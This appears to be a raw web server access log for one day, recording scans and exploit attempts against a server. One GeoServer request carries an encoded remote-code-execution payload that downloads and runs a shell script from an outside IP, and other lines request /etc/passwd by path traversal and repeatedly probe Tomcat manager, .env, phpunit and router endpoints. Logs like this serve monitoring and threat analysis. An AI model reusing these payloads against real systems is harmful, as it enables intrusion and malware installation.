198.23.242.162 - - [10/Jul/2026:00:22:59 +0000] "GET /v2 HTTP/1.1" 401 105
45.198.224.244 - - [10/Jul/2026:11:20:52 +0000] "POST /_next/server HTTP/1.1" 401 437
45.198.224.244 - - [10/Jul/2026:11:20:53 +0000] "POST /app HTTP/1.1" 401 437
45.198.224.244 - - [10/Jul/2026:11:20:53 +0000] "POST /api/route HTTP/1.1" 500 147
43.240.65.201 - - [10/Jul/2026:11:36:42 +0000] "GET /manager/html HTTP/1.1" 401 140
176.65.148.81 - - [10/Jul/2026:11:37:12 +0000] "CONNECT cloudflare.com:443 HTTP/1.1" 501 443
65.49.1.24 - - [10/Jul/2026:12:18:24 +0000] "GET / HTTP/1.1" 401 132
65.49.1.31 - - [10/Jul/2026:12:21:11 +0000] "GET /?format=json HTTP/1.1" 401 103
65.49.1.37 - - [10/Jul/2026:12:21:33 +0000] "CONNECT www.shadowserver.org:443 HTTP/1.1" 501 443
65.49.1.24 - - [10/Jul/2026:12:21:53 +0000] "GET /geoserver/web/ HTTP/1.1" 401 144
45.198.224.5 - - [10/Jul/2026:13:43:52 +0000] "GET /login HTTP/1.1" 500 145
138.197.24.249 - - [10/Jul/2026:13:51:50 +0000] "GET / HTTP/1.1" 401 132
127.0.0.1 - - [10/Jul/2026:14:02:32 +0000] "GET /api/ui/nav/categories HTTP/1.1" 200 157
127.0.0.1 - - [10/Jul/2026:14:02:32 +0000] "GET /api/ui/featured HTTP/1.1" 200 145
127.0.0.1 - - [10/Jul/2026:14:02:32 +0000] "GET /api/brands HTTP/1.1" 200 193
94.154.43.66 - - [10/Jul/2026:14:03:24 +0000] "GET /login HTTP/1.1" 500 145
20.65.152.136 - - [10/Jul/2026:14:10:53 +0000] "GET / HTTP/1.1" 401 132
20.65.152.136 - - [10/Jul/2026:14:10:53 +0000] "-" 400 435
127.0.0.1 - - [10/Jul/2026:14:27:03 +0000] "GET /api/ui/nav/categories HTTP/1.1" 200 157
127.0.0.1 - - [10/Jul/2026:14:27:04 +0000] "GET /api/brands HTTP/1.1" 200 193
127.0.0.1 - - [10/Jul/2026:14:27:04 +0000] "GET /api/ui/featured HTTP/1.1" 200 145
127.0.0.1 - - [10/Jul/2026:14:27:46 +0000] "GET /api/brands HTTP/1.1" 200 193
127.0.0.1 - - [10/Jul/2026:14:27:46 +0000] "GET /api/ui/featured HTTP/1.1" 200 145
127.0.0.1 - - [10/Jul/2026:14:28:07 +0000] "GET /api/ui/nav/categories HTTP/1.1" 200 157
127.0.0.1 - - [10/Jul/2026:14:28:07 +0000] "GET /api/ui/featured HTTP/1.1" 200 145
127.0.0.1 - - [10/Jul/2026:14:28:07 +0000] "GET /api/brands HTTP/1.1" 200 193
127.0.0.1 - - [10/Jul/2026:14:28:08 +0000] "GET /api/listing/items/1 HTTP/1.1" 200 271
127.0.0.1 - - [10/Jul/2026:14:28:16 +0000] "GET /api/brands HTTP/1.1" 200 193
127.0.0.1 - - [10/Jul/2026:14:28:16 +0000] "GET /api/ui/featured HTTP/1.1" 200 145
127.0.0.1 - - [10/Jul/2026:14:28:57 +0000] "POST /authenticate HTTP/1.1" 400 93
127.0.0.1 - - [10/Jul/2026:14:29:04 +0000] "GET /api/ui/featured HTTP/1.1" 200 145
127.0.0.1 - - [10/Jul/2026:14:29:04 +0000] "GET /api/ui/nav/categories HTTP/1.1" 200 157
127.0.0.1 - - [10/Jul/2026:14:29:04 +0000] "GET /api/brands HTTP/1.1" 200 193
54.167.234.21 - - [10/Jul/2026:15:14:12 +0000] "GET / HTTP/1.1" 401 132
127.0.0.1 - - [10/Jul/2026:15:52:30 +0000] "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 154
43.240.65.201 - - [10/Jul/2026:15:52:56 +0000] "GET /manager/html HTTP/1.1" 401 140
43.240.65.201 - - [10/Jul/2026:15:52:57 +0000] "GET /manager/html HTTP/1.1" 401 140
43.240.65.201 - - [10/Jul/2026:15:52:57 +0000] "GET /manager/html HTTP/1.1" 401 141
43.240.65.201 - - [10/Jul/2026:15:52:58 +0000] "GET /manager/html HTTP/1.1" 401 140
43.240.65.201 - - [10/Jul/2026:15:52:58 +0000] "GET /manager/html HTTP/1.1" 401 140
43.240.65.201 - - [10/Jul/2026:15:52:59 +0000] "GET /manager/html HTTP/1.1" 401 143
43.240.65.201 - - [10/Jul/2026:15:52:59 +0000] "GET /manager/html HTTP/1.1" 401 141
43.240.65.201 - - [10/Jul/2026:15:53:00 +0000] "GET /manager/html HTTP/1.1" 401 140
43.240.65.201 - - [10/Jul/2026:15:53:00 +0000] "GET /manager/html HTTP/1.1" 401 140
43.240.65.201 - - [10/Jul/2026:15:53:01 +0000] "GET /manager/html HTTP/1.1" 401 142
43.240.65.201 - - [10/Jul/2026:15:53:01 +0000] "GET /manager/html HTTP/1.1" 401 142
43.240.65.201 - - [10/Jul/2026:15:53:02 +0000] "GET /manager/html HTTP/1.1" 401 143
43.240.65.201 - - [10/Jul/2026:15:53:02 +0000] "GET /manager/html HTTP/1.1" 401 143
43.240.65.201 - - [10/Jul/2026:15:53:03 +0000] "GET /manager/html HTTP/1.1" 401 143
43.240.65.201 - - [10/Jul/2026:15:53:03 +0000] "GET /manager/html HTTP/1.1" 401 142
43.240.65.201 - - [10/Jul/2026:15:53:04 +0000] "GET /manager/html HTTP/1.1" 401 142
43.240.65.201 - - [10/Jul/2026:15:53:04 +0000] "GET /manager/html HTTP/1.1" 401 143
43.240.65.201 - - [10/Jul/2026:15:53:05 +0000] "GET /manager/html HTTP/1.1" 401 142
43.240.65.201 - - [10/Jul/2026:15:53:05 +0000] "GET /manager/html HTTP/1.1" 401 142
43.240.65.201 - - [10/Jul/2026:15:53:06 +0000] "GET /manager/html HTTP/1.1" 401 142
43.240.65.201 - - [10/Jul/2026:15:53:06 +0000] "GET /manager/html HTTP/1.1" 401 143
43.240.65.201 - - [10/Jul/2026:15:53:07 +0000] "GET /manager/html HTTP/1.1" 401 143
43.240.65.201 - - [10/Jul/2026:15:53:07 +0000] "GET /manager/html HTTP/1.1" 401 142
43.240.65.201 - - [10/Jul/2026:15:53:07 +0000] "GET /manager/html HTTP/1.1" 401 143
43.240.65.201 - - [10/Jul/2026:15:53:08 +0000] "GET /manager/html HTTP/1.1" 401 143
178.16.55.3 - - [10/Jul/2026:16:23:00 +0000] "-" 400 435
178.16.55.3 - - [10/Jul/2026:16:23:04 +0000] "-" 400 435
141.98.11.11 - - [10/Jul/2026:16:27:40 +0000] "GET / HTTP/1.1" 401 103
185.13.43.194 - - [10/Jul/2026:16:44:21 +0000] "-" 400 435
185.13.97.205 - - [10/Jul/2026:16:44:21 +0000] "GET / HTTP/1.1" 401 278
176.65.148.99 - - [10/Jul/2026:17:27:59 +0000] "POST /login HTTP/1.1" 401 -
94.154.43.64 - - [10/Jul/2026:18:01:22 +0000] "GET /geoserver/wfs?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=sf:archsites&valueReference=exec(java.lang.Runtime.getRuntime(),%27bash%20-c%20%7Becho%2CKHdnZXQgLXFPLSBodHRwOi8vNDUuMTUzLjM0LjE1My9yb25kby5gYHp5dC5zaHx8YnVzeWJveCB3Z2V0IC1xTy0gaHR0cDovLzQ1LjE1My4zNC4xNTMvcm9uZG8uYGB6eXQuc2h8fGN1cmwgLXMgaHR0cDovLzQ1LjE1My4zNC4xNTMvcm9uZG8uYGB6eXQuc2gpfHNo%7D%7C%7Bbase64%2C-d%7D%7Csh%27) HTTP/1.1" 401 116
204.76.203.30 - - [10/Jul/2026:18:28:53 +0000] "GET /json/ HTTP/1.1" 401 136
5.61.209.92 - - [10/Jul/2026:18:30:31 +0000] "GET /SDK/webLanguage HTTP/1.1" 401 149
127.0.0.1 - - [10/Jul/2026:18:30:45 +0000] "GET /api/ui/nav/categories HTTP/1.1" 200 157
127.0.0.1 - - [10/Jul/2026:18:30:54 +0000] "GET /api/ui/featured HTTP/1.1" 200 145
127.0.0.1 - - [10/Jul/2026:18:30:54 +0000] "GET /api/brands HTTP/1.1" 200 193
43.240.65.201 - - [10/Jul/2026:18:31:02 +0000] "GET /manager/text/list HTTP/1.1" 401 147
43.240.65.201 - - [10/Jul/2026:18:31:02 +0000] "GET /manager/text/list HTTP/1.1" 401 147
43.240.65.201 - - [10/Jul/2026:18:31:03 +0000] "GET /manager/text/list HTTP/1.1" 401 146
43.240.65.201 - - [10/Jul/2026:18:31:03 +0000] "GET /manager/text/list HTTP/1.1" 401 147
43.240.65.201 - - [10/Jul/2026:18:31:04 +0000] "GET /manager/text/list HTTP/1.1" 401 146
43.240.65.201 - - [10/Jul/2026:18:31:04 +0000] "GET /manager/text/list HTTP/1.1" 401 146
43.240.65.201 - - [10/Jul/2026:18:31:05 +0000] "GET /manager/text/list HTTP/1.1" 401 147
43.240.65.201 - - [10/Jul/2026:18:31:05 +0000] "GET /manager/text/list HTTP/1.1" 401 146
43.240.65.201 - - [10/Jul/2026:18:31:06 +0000] "GET /manager/text/list HTTP/1.1" 401 146
43.240.65.201 - - [10/Jul/2026:18:31:06 +0000] "GET /manager/text/list HTTP/1.1" 401 146
43.240.65.201 - - [10/Jul/2026:18:31:07 +0000] "GET /manager/text/list HTTP/1.1" 401 146
43.240.65.201 - - [10/Jul/2026:18:31:07 +0000] "GET /manager/text/list HTTP/1.1" 401 147
43.240.65.201 - - [10/Jul/2026:18:31:08 +0000] "GET /manager/text/list HTTP/1.1" 401 146
43.240.65.201 - - [10/Jul/2026:18:31:08 +0000] "GET /manager/text/list HTTP/1.1" 401 147
43.240.65.201 - - [10/Jul/2026:18:31:09 +0000] "GET /manager/text/list HTTP/1.1" 401 146
43.240.65.201 - - [10/Jul/2026:18:31:09 +0000] "GET /manager/text/list HTTP/1.1" 401 146
43.240.65.201 - - [10/Jul/2026:18:31:09 +0000] "GET /manager/text/list HTTP/1.1" 401 147
43.240.65.201 - - [10/Jul/2026:18:31:10 +0000] "GET /manager/text/list HTTP/1.1" 401 145
43.240.65.201 - - [10/Jul/2026:18:31:10 +0000] "GET /manager/text/list HTTP/1.1" 401 146
43.240.65.201 - - [10/Jul/2026:18:31:11 +0000] "GET /manager/text/list HTTP/1.1" 401 145
43.240.65.201 - - [10/Jul/2026:18:31:11 +0000] "GET /manager/text/list HTTP/1.1" 401 146
43.240.65.201 - - [10/Jul/2026:18:31:12 +0000] "GET /manager/text/list HTTP/1.1" 401 146
43.240.65.201 - - [10/Jul/2026:18:31:12 +0000] "GET /manager/text/list HTTP/1.1" 401 146
43.240.65.201 - - [10/Jul/2026:18:31:13 +0000] "GET /manager/text/list HTTP/1.1" 401 146
43.240.65.201 - - [10/Jul/2026:18:31:13 +0000] "GET /manager/text/list HTTP/1.1" 401 145
127.0.0.1 - - [10/Jul/2026:18:31:33 +0000] "GET /api/listing/items HTTP/1.1" 200 265
127.0.0.1 - - [10/Jul/2026:18:31:42 +0000] "GET /api/listing/items/1 HTTP/1.1" 200 271
127.0.0.1 - - [10/Jul/2026:18:32:04 +0000] "GET /api/listing/items HTTP/1.1" 200 265
127.0.0.1 - - [10/Jul/2026:18:32:07 +0000] "GET /api/ui/featured HTTP/1.1" 200 145
127.0.0.1 - - [10/Jul/2026:18:32:07 +0000] "GET /api/brands HTTP/1.1" 200 193
8.216.9.135 - - [10/Jul/2026:18:35:55 +0000] "OPTIONS / HTTP/1.0" 200 -
8.216.9.135 - - [10/Jul/2026:18:35:55 +0000] "GET / HTTP/1.1" 401 133
34.34.103.195 - - [10/Jul/2026:18:37:35 +0000] "GET /.env HTTP/1.1" 401 107
34.34.103.195 - - [10/Jul/2026:18:37:35 +0000] "GET /dn26-canary-d49e12bb51d016348c2b3fff2673d944 HTTP/1.1" 401 147
34.34.103.195 - - [10/Jul/2026:18:37:35 +0000] "GET /robots.txt HTTP/1.1" 401 113
34.34.103.195 - - [10/Jul/2026:18:37:36 +0000] "GET /sitemap.xml HTTP/1.1" 401 114
205.210.31.12 - - [10/Jul/2026:18:55:27 +0000] "GET / HTTP/1.0" 401 92
5.187.35.26 - - [10/Jul/2026:18:59:24 +0000] "GET /..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 400 435
85.217.149.35 - - [10/Jul/2026:19:08:24 +0000] "GET / HTTP/1.1" 401 132
127.0.0.1 - - [10/Jul/2026:19:13:43 +0000] "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 154
93.177.75.154 - - [10/Jul/2026:19:18:12 +0000] "GET / HTTP/1.1" 401 133
93.177.75.154 - - [10/Jul/2026:19:18:12 +0000] "GET / HTTP/1.1" 401 132
94.154.43.66 - - [10/Jul/2026:19:51:54 +0000] "GET /login HTTP/1.1" 500 144
127.0.0.1 - - [10/Jul/2026:19:59:24 +0000] "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 154
141.98.11.11 - - [10/Jul/2026:20:01:27 +0000] "GET / HTTP/1.1" 401 103
141.98.11.11 - - [10/Jul/2026:20:06:54 +0000] "GET / HTTP/1.1" 401 103
127.0.0.1 - - [10/Jul/2026:20:12:25 +0000] "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 154
204.76.203.30 - - [10/Jul/2026:20:13:42 +0000] "GET /json/ HTTP/1.1" 401 136
205.210.31.135 - - [10/Jul/2026:20:19:18 +0000] "GET / HTTP/1.1" 401 132
69.164.217.74 - - [10/Jul/2026:20:33:41 +0000] "GET / HTTP/1.1" 401 132
50.116.49.221 - - [10/Jul/2026:20:35:19 +0000] "GET / HTTP/1.1" 401 132
94.154.43.230 - - [10/Jul/2026:21:20:03 +0000] "POST /goform/set_LimitClient_cfg HTTP/1.1" 401 154
45.194.92.14 - - [10/Jul/2026:21:25:12 +0000] "GET / HTTP/1.1" 401 132
45.33.109.18 - - [10/Jul/2026:21:33:09 +0000] "GET / HTTP/1.1" 401 132
195.178.110.137 - - [10/Jul/2026:21:33:31 +0000] "-" 400 435
195.178.110.137 - - [10/Jul/2026:21:33:31 +0000] "-" 400 435
195.178.110.137 - - [10/Jul/2026:21:33:32 +0000] "-" 400 435
195.178.110.137 - - [10/Jul/2026:21:33:32 +0000] "-" 400 435
195.178.110.137 - - [10/Jul/2026:21:33:33 +0000] "-" 400 435
195.178.110.137 - - [10/Jul/2026:21:33:34 +0000] "-" 400 435
195.178.110.137 - - [10/Jul/2026:21:33:34 +0000] "CONNECT 8.8.8.8:443 HTTP/1.1" 501 443
195.178.110.137 - - [10/Jul/2026:21:33:34 +0000] "CONNECT 8.8.8.8:443 HTTP/1.1" 501 443
195.178.110.137 - - [10/Jul/2026:21:33:35 +0000] "CONNECT 8.8.8.8:443 HTTP/1.1" 501 443
45.79.181.223 - - [10/Jul/2026:21:34:09 +0000] "GET / HTTP/1.1" 401 132
127.0.0.1 - - [10/Jul/2026:21:35:30 +0000] "GET /api/ui/nav/categories HTTP/1.1" 200 157
176.120.22.240 - - [10/Jul/2026:22:08:22 +0000] "-" 400 435
94.154.43.230 - - [10/Jul/2026:22:15:28 +0000] "POST /goform/set_LimitClient_cfg HTTP/1.1" 401 154
45.198.224.5 - - [10/Jul/2026:22:22:07 +0000] "GET /login HTTP/1.1" 500 145
69.164.217.245 - - [10/Jul/2026:22:33:17 +0000] "GET / HTTP/1.1" 401 131
172.236.119.165 - - [10/Jul/2026:22:33:52 +0000] "GET / HTTP/1.1" 401 132
45.205.1.246 - - [10/Jul/2026:22:43:59 +0000] "GET / HTTP/1.1" 401 103
45.205.1.246 - - [10/Jul/2026:22:44:01 +0000] "GET /favicon.ico HTTP/1.1" 401 114
205.210.31.56 - - [10/Jul/2026:23:02:11 +0000] "GET / HTTP/1.1" 401 132
205.210.31.166 - - [10/Jul/2026:23:29:17 +0000] "-" 400 435
205.210.31.166 - - [10/Jul/2026:23:29:17 +0000] "-" 400 435
176.120.22.240 - - [10/Jul/2026:23:43:07 +0000] "-" 400 435
164.90.232.107 - - [10/Jul/2026:23:59:11 +0000] "GET /cgi-bin/authLogin.cgi HTTP/1.1" 401 124
